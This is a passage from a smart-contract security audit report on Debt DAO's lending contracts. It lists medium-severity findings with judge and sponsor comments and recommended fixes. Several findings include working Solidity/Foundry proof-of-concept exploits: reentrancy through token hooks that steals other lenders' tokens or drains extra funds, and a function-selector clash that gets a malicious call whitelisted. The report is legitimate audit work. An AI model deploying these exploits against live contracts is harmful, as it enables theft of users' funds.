line.addCredit(drate, frate, amount, token, address(this));\n        }\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n            emit GotMoney(amount);\n            if(!lock){\n                lock = true;\n                line.close(id);\n            }\n        }\n\n        receive() external payable {\n        }\n\n    }\n\nAdd `Token777.sol` to mocks folder:\n\n    pragma solidity 0.8.9;\n\n    import \"openzeppelin/token/ERC20/ERC20.sol\";\n    interface IERC777Recipient {\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external;\n    }\n\n    contract Token777 is ERC20(\"Token used to trade\", \"777\") {\n        mapping(address => uint256) private _balances;\n        mapping(address => address) private registry;\n        uint256 private _totalSupply;\n\n        string private _name;\n        string private _symbol;\n\n        // ERC20-allowances\n        mapping(address => mapping(address => uint256)) private _allowances;\n\n        event Test(address);\n\n        constructor() {\n        }\n\n        function mint(address account, uint256 amount) external returns(bool) {\n            _mint(account, amount);\n            return true;\n        }\n\n        function _mint(\n            address account,\n            uint256 amount\n        ) internal virtual override{\n            require(account != address(0), \"ERC777: mint to the zero address\");\n\n            // Update state variables\n            _totalSupply += amount;\n            _balances[account] += amount;\n            emit Test(account);\n        }\n        function balanceOf(address account) public view virtual override returns (uint256) {\n            return _balances[account];\n        }\n\n        function approve(address spender, uint256 value) public virtual override returns (bool) {\n            address holder = _msgSender();\n            _approve(holder, spender, value);\n            return true;\n        }\n       function _approve(\n            address holder,\n            address spender,\n            uint256 value\n        ) internal  virtual override {\n            require(holder != address(0), \"ERC777: approve from the zero address\");\n            require(spender != address(0), \"ERC777: approve to the zero address\");\n\n            _allowances[holder][spender] = value;\n            emit Approval(holder, spender, value);\n        }\n        function transferFrom(\n            address holder,\n            address recipient,\n            uint256 amount\n        ) public virtual override returns (bool) {\n            address spender = _msgSender();\n            emit Test(msg.sender);\n            _spendAllowance(holder, spender, amount);\n            _send(holder, recipient, amount, \"\", \"\", false);\n            return true;\n        }\n\n        function allowance(address holder, address spender) public view virtual override returns (uint256) {\n            return _allowances[holder][spender];\n        }\n        function _spendAllowance(\n            address owner,\n            address spender,\n            uint256 amount\n        ) internal override virtual {\n            emit Test(msg.sender);\n            uint256 currentAllowance = allowance(owner, spender);\n            if (currentAllowance != type(uint256).max) {\n                require(currentAllowance >= amount, \"ERC777: insufficient allowance\");\n                unchecked {\n                    _approve(owner, spender, currentAllowance - amount);\n                }\n            }\n        }\n\n        function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n            _send(_msgSender(), recipient, amount, \"\", \"\", false);\n            return true;\n        }\n\n        function _send(\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) internal virtual {\n            require(from != address(0), \"ERC777: transfer from the zero address\");\n            require(to != address(0), \"ERC777: transfer to the zero address\");\n\n            address operator = _msgSender();\n\n            _move(operator, from, to, amount, userData, operatorData);\n\n            _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);\n        }\n\n\n        function _move(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData\n        ) private {\n            uint256 fromBalance = _balances[from];\n            require(fromBalance >= amount, \"ERC777: transfer amount exceeds balance\");\n            unchecked {\n                _balances[from] = fromBalance - amount;\n            }\n            _balances[to] += amount;\n        }\n\n        function _callTokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) private {\n            address implementer = registry[to];\n            if (implementer != address(0)) {\n                IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);\n            }\n        }\n\n        function mockAddToRegistry() external {\n            registry[msg.sender] = msg.sender;\n        }\n\n    }\n\nAdd the following imports to `LineOfCredit.t.sol`:\n\n    import { MockLender } from \"../mock/MockLender.sol\";\n    import { Token777 } from \"../mock/Token777.sol\";\n\nAdd the following test to `LineOfCredit.t.sol`:\n\n```\n\n    function test_reentrancy() public {\n        uint256 lenderOneAmount = 1000;\n        uint256 lenderTwoAmount = 1000;\n        Token777 tokenUsed = new Token777();\n        // Create lenderController \n        address lenderOneController = address(0xdeadbeef);\n        address lender2 = address(0x1337);\n\n        // Create lenderContract \n        vm.startPrank(lenderOneController);\n        MockLender lenderOneContract = new MockLender(address(line));\n        vm.stopPrank();\n\n        // give lenders their lend amount of token\n        tokenUsed.mint(address(lenderOneContract), lenderOneAmount);\n        tokenUsed.mint(address(lender2), lenderTwoAmount);\n\n        // add support of the token to the SimpleOracle\n        oracle.changePrice(address(tokenUsed), 1000 * 1e8); // 1000 USD\n\n        // Borrowers adds credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed), address(lenderOneContract));\n        vm.stopPrank();\n\n        // LenderOne adds credit line\n        vm.startPrank(lenderOneController);\n        lenderOneContract.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed));\n        vm.stopPrank();\n\n        //borrow 1 ether\n        bytes32 id_first = line.ids(0);\n        vm.startPrank(borrower);\n        line.borrow(id_first, lenderOneAmount);\n        vm.stopPrank();\n        \n        // Borrowers adds an additional credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed), address(lender2));\n        vm.stopPrank();\n\n        // Lender2 adds an additional credit line from  \n        vm.startPrank(lender2);\n        tokenUsed.approve(address(line), lenderTwoAmount);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed),  address(lender2));\n        vm.stopPrank();\n\n        // repay all debt to lender 1\n        vm.startPrank(borrower);\n        tokenUsed.approve(address(line), lenderOneAmount);\n        line.depositAndRepay(lenderOneAmount);\n        line.close(id_first);\n        vm.stopPrank();\n        \n        //validate that lender1 was able to steal lender2 tokens\n        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);\n    }\n```\n\nTo run the POC execute:\n`forge test -v`\n\nExpected output:\n\n    [PASS] test_reentrancy() (gas: 1636410)\n    Test result: ok. 1 passed; 0 failed; finished in 1.71ms\n\nTo get full trace execute:\n`forge test -vvvv`\n\n### Tools Used\n\nVS Code, Foundry.\n\n### Recommended Mitigation Steps\n\nSend tokens only at the end of `_close(Credit memory credit, bytes32 id)` or add a reentrancyGuard.\n\n**[kibagateaux (Debt DAO) disputed and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1332394657):**\n > Similar comments to [#176](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176). Both Lenders would have to agree to use tokens that have inherent reentrancy attacks built into the token. This issue feels much more valid than the other one.\n> \n> In my opinion its not valid to say \"if you add malicious things, malicious things happen\". If I didn't want token reentrancy attacks, I simply wouldn't add tokens with explicit arbitrary reentrancy abilities.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1340012972):**\n> That line of reasoning doesn't hold up. The user should be protected against accidentally allowing a token that has a reentrancy attack vector. There is not an immediate and obvious difference between ERC777 and ERC20 tokens. This issue has been a viable Medium risk going all the way back to Uniswap V2 (or possibly before).\n\n\n***\n\n## [[M-06] The lender can draw out extra credit token from borrower's account](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176)\n*Submitted by [KingNFT](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176), also found by [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/337), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/332), and [Ch\\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/311)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488>\n\n### Impact\n\nWhen the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower's account. And the `count` state variable would also be underflowed, cause the line contract can't be 'REPAID', the borrower will never be able to get back the collateral.\n\nP.S.\n\n[Similar attack on imBTC](https://zengo.com/imbtc-defi-hack-explained)\n\n### Proof of Concept\n\nThe vulnerable point is in `\\_close()` function,\n\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        // ...\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n        // ...\n    }\n\nThe following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under 'test' directory, it will pass\n\n```\npragma solidity 0.8.9;\n\nimport \"forge-std/Test.sol\";\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { Address } from \"openzeppelin/utils/Address.sol\";\n\nimport { Spigot } from \"../modules/spigot/Spigot.sol\";\nimport { Escrow } from \"../modules/escrow/Escrow.sol\";\nimport { SecuredLine } from \"../modules/credit/SecuredLine.sol\";\nimport { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\nimport { ISecuredLine } from \"../interfaces/ISecuredLine.sol\";\n\nimport { LineLib } from \"../utils/LineLib.sol\";\nimport { MutualConsent } from \"../utils/MutualConsent.sol\";\n\nimport { MockLine } from \"../mock/MockLine.sol\";\nimport { SimpleOracle } from \"../mock/SimpleOracle.sol\";\nimport { RevenueToken } from \"../mock/RevenueToken.sol\";\n\n\ninterface IHook {\n    function tokensReceived(\n        address from,\n        address to,\n        uint256 amount\n    ) external;\n}\n\ncontract RevenueTokenWithHook is RevenueToken {\n    using Address for address;\n    mapping(address => bool) public registry;\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        super._afterTokenTransfer(from, to, amount);\n        if (registry[to]) {\n            IHook(to).tokensReceived(from, to, amount);\n        }\n    }\n\n    function registerHook(address addr) external {\n        registry[addr] = true;\n    }\n}\n\ncontract Attacker is IHook {\n    uint256 constant ATTACK_COUNT = 10;\n    SecuredLine line;\n    address borrower;\n    RevenueTokenWithHook token;\n    uint256 count;\n    bool attackEnable;\n    constructor(address line_, address borrower_, address token_) {\n        line = SecuredLine(payable(line_));\n        borrower = borrower_;\n        token = RevenueTokenWithHook(token_);\n        token.registerHook(address(this));\n    }\n    function tokensReceived(\n            address,\n            address,\n            uint256\n        ) external {\n        if (msg.sender != address(token)) return;\n        if (!attackEnable) return;\n        uint256 count_ = count;\n        if (count_ >= ATTACK_COUNT) return;\n        count = count_ + 1;\n        bytes32 id = line.ids(0);\n        (uint256 deposit,,,,,,) = line.credits(id);\n        token.transfer(address(line), deposit);\n        line.close(id);\n    }\n\n    function enableAttack() external {\n        attackEnable = true;\n    }\n}\n\n\ncontract ExploitCloseFunctionTest is Test {\n    uint256 constant ONE_YEAR = 365.25 days;\n    uint256 constant ATTACK_COUNT = 10;\n    Escrow escrow;\n    Spigot spigot;\n    RevenueTokenWithHook supportedToken1;\n    RevenueToken supportedToken2;\n    RevenueToken unsupportedToken;\n    SimpleOracle oracle;\n    SecuredLine line;\n    uint mintAmount = 100 ether;\n    uint MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    uint32 minCollateralRatio = 10000; // 100%\n    uint128 dRate = 100;\n    uint128 fRate = 1;\n    uint ttl = ONE_YEAR;\n\n    address borrower;\n    address arbiter;\n    address lender;\n\n    function setUp() public {\n        borrower = address(20);\n        arbiter = address(this);\n        supportedToken1 = new RevenueTokenWithHook();\n        supportedToken2 = new RevenueToken();\n        unsupportedToken = new RevenueToken();\n\n        spigot = new Spigot(arbiter, borrower, borrower);\n        oracle = new SimpleOracle(address(supportedToken1), address(supportedToken2));\n\n        escrow = new Escrow(minCollateralRatio, address(oracle), arbiter, borrower);\n\n        line = new SecuredLine(\n          address(oracle),\n          arbiter,\n          borrower,\n          payable(address(0)),\n          address(spigot),\n          address(escrow),\n          ONE_YEAR,\n          0\n        );\n        lender = address(new Attacker(address(line), borrower, address(supportedToken1)));\n        assertEq(supportedToken1.registry(lender), true);\n        \n        escrow.updateLine(address(line));\n        spigot.updateOwner(address(line));\n        \n        assertEq(uint(line.init()), uint(LineLib.STATUS.ACTIVE));\n\n        _mintAndApprove();\n        escrow.enableCollateral( address(supportedToken1));\n        escrow.enableCollateral( address(supportedToken2));\n   \n        vm.startPrank(borrower);\n        escrow.addCollateral(1 ether, address(supportedToken2));\n        vm.stopPrank();\n    }\n\n    function testExpoit() public {\n        _addCredit(address(supportedToken1), 1 ether);\n        bytes32 id = line.ids(0);\n        vm.warp(line.deadline() - ttl / 2);\n        line.accrueInterest();\n        (uint256 deposit, , uint256 interestAccrued, , , , ) = line.credits(id);\n        uint256 lenderBalanceBefore = supportedToken1.balanceOf(lender);\n        uint256 lenderBalanceAfterExpected = lenderBalanceBefore + deposit + interestAccrued;\n\n        Attacker(lender).enableAttack();\n        hoax(lender);\n        line.close(id);\n        vm.stopPrank();\n        uint256 lenderBalanceAfter = supportedToken1.balanceOf(lender);\n        assertEq(lenderBalanceAfter, lenderBalanceAfterExpected + interestAccrued * ATTACK_COUNT);\n        (uint256 count,) = line.counts();\n        assertEq(count, MAX_INT - ATTACK_COUNT + 1);\n    }\n\n\n    function _mintAndApprove() internal {\n        deal(lender, mintAmount);\n\n        supportedToken1.mint(borrower, mintAmount);\n        supportedToken1.mint(lender, mintAmount);\n        supportedToken2.mint(borrower, mintAmount);\n        supportedToken2.mint(lender, mintAmount);\n        unsupportedToken.mint(borrower, mintAmount);\n        unsupportedToken.mint(lender, mintAmount);\n\n        vm.startPrank(borrower);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n        vm.startPrank(lender);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n    }\n\n    function _addCredit(address token, uint256 amount) public {\n        hoax(borrower);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n        hoax(lender);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n\n```\n\nRelated links:\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173>\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAdd reentrancy protection on `close()` function.\n\n**[dmvt (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1318478806):**\n > Has external requirements making the report Medium risk, not High.\n\n**[kibagateaux (Debt DAO) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1332386899):**\n > Could be marked as \"Acknowledged\". At the end of the day Borrowers and Lenders agree to which tokens to use, Debt DAO has no part in decision.\n> \n> In my opinion it's not valid to say \"If you add malicious things, malicious things happen\". If I didn't want token reentrancy attacks, I simply wouldn't add tokens with explicit arbitrary reentrancy abilities. \n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1340035461):**\n > I think the sponsor misunderstands something fundamental about the way reentrancy attacks happen. The token itself isn't malicious. It's the external calls the token makes as part of its normal interaction that _can be made_, but are not necessarily, malicious. Issue stands.\n\n\n\n***\n\n## [[M-07] Whitelisted functions aren't scoped to revenue contracts and may lead to unnoticed calls due to selector clashing](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312)\n*Submitted by [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312), also found by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/474), [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/285), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/276), [Ruhum](https://github.com/code-423n4/2022-11-debtdao-findings/issues/180), and [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/71)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14>\n\nWhitelisted functions in the Spigot contract don't have any kind of association or validation to which revenue contract they are intended to be used. This may lead to inadvertently whitelisting a function in another revenue contract that has the same selector but a different name (signature).\n\n### Impact\n\nFunctions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not difficult) to find different functions that have the same selector.\n\nIn this way, a bad actor can try to use an innocent looking function that matches the selector of another function (in a second revenue contract) that has malicious intentions. The arbiter will review the innocent function, whitelist its selector, while unknowingly enabling a potential call to the malicious function, since whitelisted functions can be called on any revenue contract.\n\nMining for selector clashing is feasible since selectors are 4 bytes and the search space isn't that big for current hardware.\n\nThis is similar to the attack found on proxies, documented [here](https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357) and [here](https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070).\n\n### Proof of Concept\n\nIn the following test, the `collate_propagate_storage(bytes16)` function is whitelisted because it looks safe enough to the arbiter. Now, `collate_propagate_storage(bytes16)` has the same selector as `burn(uint256)`, which allows a bad actor to call `EvilRevenueContract.burn` using the `operate` function of the Spigot.\n\nNote: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.\n\n    contract InnocentRevenueContract {\n        function collate_propagate_storage(bytes16) external {\n            // It's all safe here!\n            console.log(\"Hey it's all good here\");\n        }\n    }\n\n    contract EvilRevenueContract {\n        function burn(uint256) external {\n            // Burn the world!\n            console.log(\"Boom!\");\n        }\n    }\n\n    function test_WhitelistFunction_SelectorClash() public {\n          vm.startPrank(owner);\n          \n          spigot = new Spigot(owner, treasury, operator);\n          \n          // Arbiter looks at InnocentRevenueContract.collate_propagate_storage and thinks it's safe to whitelist it (this is a simplified version, in a real deploy this comes from the SpigotedLine contract)\n          spigot.updateWhitelistedFunction(InnocentRevenueContract.collate_propagate_storage.selector, true);\n          assertTrue(spigot.isWhitelisted(InnocentRevenueContract.collate_propagate_storage.selector));\n          \n          // Due to selector clashing EvilRevenueContract.burn gets whitelisted too!\n          assertTrue(spigot.isWhitelisted(EvilRevenueContract.burn.selector));\n          \n          \n          EvilRevenueContract evil = new EvilRevenueContract();\n          // ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);\n          // require(spigot.addSpigot(address(evil), settings), \"Failed to add spigot\");\n          \n          vm.stopPrank();\n                  \n          // And we can call it through operate...\n          vm.startPrank(operator);\n          spigot.operate(address(evil), abi.encodeWithSelector(EvilRevenueContract.burn.selector, type(uint256).max));\n      }\n\n### Recommendation\n\nAssociate whitelisted functions to particular revenue contracts (for example, using a `mapping(address => mapping(bytes4 => bool))`) and validate that the selector for the call is enabled for that specific revenue contract in the `operate` function.\n\n**[dmvt (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312)**\n\n**[kibagateaux (Debt DAO) acknowledged](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312#issuecomment-1405075722)**\n\n\n\n***\n\n## [[M-08] Mistakenly sent eth could be locked](https://github.com/code-423n4/2022-11-debtdao-findings/issues/355)\n*Submitted by [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/355), also found by [0xSmartContract](https://github.com/code-423n4/2022-11-debtdao-findings/issues/507), [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/445), [rbserver](https://github.com/code-423n4/2022-11-debtdao-findings/issues/405), [datapunk](https://github.com/code-423n4/2022-11-debtdao-findings/issues/388), [eierina](https://github.com/code-423n4/2022-11-debtdao-findings/issues/387), [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/284), [Tomo](https://github.com/code-423n4/2022-11-debtdao-findings/issues/257), [0xbepresent](https://github.com/code-423n4/2022-11-debtdao-findings/issues/201), [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/104), and [cloudjunky](https://github.com/code-423n4/2022-11-debtdao-findings/issues/89)*\n\nIf ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked.\n\nThere are several functions that could be affected and cause user fund lock:\n\n*   `addCollateral()`\n*   `addCredit()`\n*   `increaseCredit()`\n*   `depositAndClose()`\n*   `depositAndRepay()`\n*   `close()`\n\n### Proof of Concept\n\nIn `receiveTokenOrETH()`, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract.\n\n```solidity\n// Line-of-Credit/contracts/utils/LineLib.sol\n    function receiveTokenOrETH(\n      address token,\n      address sender,\n      uint256 amount\n    )\n      external\n      returns (bool)\n    {\n        if(token == address(0)) { revert TransferFailed(); }\n        if(token != Denominations.ETH) { // ERC20\n            IERC20(token).safeTransferFrom(sender, address(this), amount);\n        } else { // ETH\n            if(msg.value < amount) { revert TransferFailed(); }\n        }\n        return true;\n    }\n```\n\n### Recommended Mitigation Steps\n\nIn the ERC20 part, add check for `msg.value` to ensure no eth is sent:\n\n```solidity\n        if(token != Denominations.ETH) { // ERC20\n            if (msg.value > 0) { revert TransferFailed(); }\n            IERC20(token).safeTransferFrom(sender, address(this), amount);\n        } else { // ETH\n```\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/355#issuecomment-1405077581)**\n\n\n\n***\n\n## [[M-09] Variable balance ERC20 support](https://github.com/code-423n4/2022-11-debtdao-findings/issues/367)\n*Submitted by [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/367), also found by [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/525), [everyanykey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/499), [pashov](https://github.com/code-423n4/2022-11-debtdao-findings/issues/491), [rbserver](https://github.com/code-423n4/2022-11-debtdao-findings/issues/404), [Ch\\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/322), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/300), [cccz](https://github.com/code-423n4/2022-11-debtdao-findings/issues/294), [ladboy233](https://github.com/code-423n4/2022-11-debtdao-findings/issues/287), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/269), [codexploder](https://github.com/code-423n4/2022-11-debtdao-findings/issues/196), [Ruhum](https://github.com/code-423n4/2022-11-debtdao-findings/issues/188), [Bnke0x0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/186), [ayeslick](https://github.com/code-423n4/2022-11-debtdao-findings/issues/171), [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/123), [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/107), and [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/26)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L94-L96>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L75-L79>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L273-L280>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L487-L493>\n\n### Impact\n\nSome ERC20 may be tricky for the balance. Such as:\n\n*   fee on transfer (STA, USDT also has this mode)\n*   rebasing (aToken from AAVE)\n*   variable balance (stETH, balance could go up and down)\n\nFor these tokens, the balance can change over time, even without `transfer()/transferFrom()`. But current accounting stores the spot balance of the asset.\n\nThe impacts include:\n\n*   the calculation of collateral value could be inaccurate\n*   protocol could lose funds due to the deposit/repay amount being less than the actual transferred amount after fee\n*   the amount user withdraw collateral when `_close()` will be inaccurate\n    *   some users could lose funds due to under value\n    *   some funds could be locked due to the balance inflation\n    *   some funds might be locked due to the balance deflation\n\n### Proof of Concept\n\nThe spot new deposit amount is stored in the mapping `self.deposited[token].amount` and `credit.deposit`, and later used to calculate the collateral value and withdraw amount.\n\n```solidity\n// Line-of-Credit/contracts/utils/EscrowLib.sol\n    function addCollateral(EscrowState storage self, address oracle, uint256 amount, address token) {\n        // ...\n        LineLib.receiveTokenOrETH(token, msg.sender, amount);\n\n        self.deposited[token].amount += amount;\n        // ...\n    }\n\n    function _getCollateralValue(EscrowState storage self, address oracle) public returns (uint256) {\n            // ...\n            d = self.deposited[token];\n                // ...\n                collateralValue += CreditLib.calculateValue(\n                  o.getLatestAnswer(d.asset),\n                  deposit,\n                  d.assetDecimals\n                );\n            // ...\n    }\n\n// Line-of-Credit/contracts/modules/credit/LineOfCredit.sol\n    function increaseCredit(bytes32 id, uint256 amount) {\n        // ...\n        Credit memory credit = credits[id];\n        credit = _accrue(credit, id);\n\n        credit.deposit += amount;\n        \n        credits[id] = credit;\n\n        LineLib.receiveTokenOrETH(credit.token, credit.lender, amount);\n\n        // ...\n    }\n\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        // ...\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH(\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n```\n\nHowever, if the balance changed later, the returned collateral value will be inaccurate. And the amount used when withdraw collateral in `_close()` is also wrong.\n\n### Recommended Mitigation Steps\n\n*   checking the before and after balance of token transfer\n*   recording the relative shares of each user instead of specific amount\n*   if necessary, call `ERC20(token).balanceOf()` to confirm the balance\n*   disallow such kind of tokens\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/367#issuecomment-1319123709):**\n > This issue encompasses all 'non-standard' ERC20 tokens and their potential side effects within the system. Special mention for report [#350](https://github.com/code-423n4/2022-11-debtdao-findings/issues/350), which adds a case this report fails to capture.\n\n**[kibagateaux (Debt DAO) disputed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/367#issuecomment-1405076131)**\n\n\n\n***\n\n## [[M-10] `address.call{value:x}()` should be used instead of `payable.transfer()`](https://github.com/code-423n4/2022-11-debtdao-findings/issues/369)\n*Submitted by [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/369), also found by [IllIllI](https://github.com/code-423n4/2022-11-debtdao-findings/issues/529), [Bnke0x0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/524), [SmartSek](https://github.com/code-423n4/2022-11-debtdao-findings/issues/506), [d3e4](https://github.com/code-423n4/2022-11-debtdao-findings/issues/500), [pashov](https://github.com/code-423n4/2022-11-debtdao-findings/issues/489), [Deivitto](https://github.com/code-423n4/2022-11-debtdao-findings/issues/469), [bananasboys](https://github.com/code-423n4/2022-11-debtdao-findings/issues/448), [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/443), [RedOneN](https://github.com/code-423n4/2022-11-debtdao-findings/issues/407), [cryptonue](https://github.com/code-423n4/2022-11-debtdao-findings/issues/398), [datapunk](https://github.com/code-423n4/2022-11-debtdao-findings/issues/389), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/361), [Ch\\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/320), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/319), [cccz](https://github.com/code-423n4/2022-11-debtdao-findings/issues/291), [peanuts](https://github.com/code-423n4/2022-11-debtdao-findings/issues/283), [Tomo](https://github.com/code-423n4/2022-11-debtdao-findings/issues/255), [merlin](https://github.com/code-423n4/2022-11-debtdao-findings/issues/247), [corerouter](https://github.com/code-423n4/2022-11-debtdao-findings/issues/238), [RaymondFam](https://github.com/code-423n4/2022-11-debtdao-findings/issues/219), [codexploder](https://github.com/code-423n4/2022-11-debtdao-findings/issues/195), [Bnke0x0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/184), [KingNFT](https://github.com/code-423n4/2022-11-debtdao-findings/issues/178), [carlitox477](https://github.com/code-423n4/2022-11-debtdao-findings/issues/177), [Satyam\\_Sharma](https://github.com/code-423n4/2022-11-debtdao-findings/issues/112), [Nyx](https://github.com/code-423n4/2022-11-debtdao-findings/issues/102), [8olidity](https://github.com/code-423n4/2022-11-debtdao-findings/issues/92), [cloudjunky](https://github.com/code-423n4/2022-11-debtdao-findings/issues/90), [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/87), [martin](https://github.com/code-423n4/2022-11-debtdao-findings/issues/48), [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/27), and 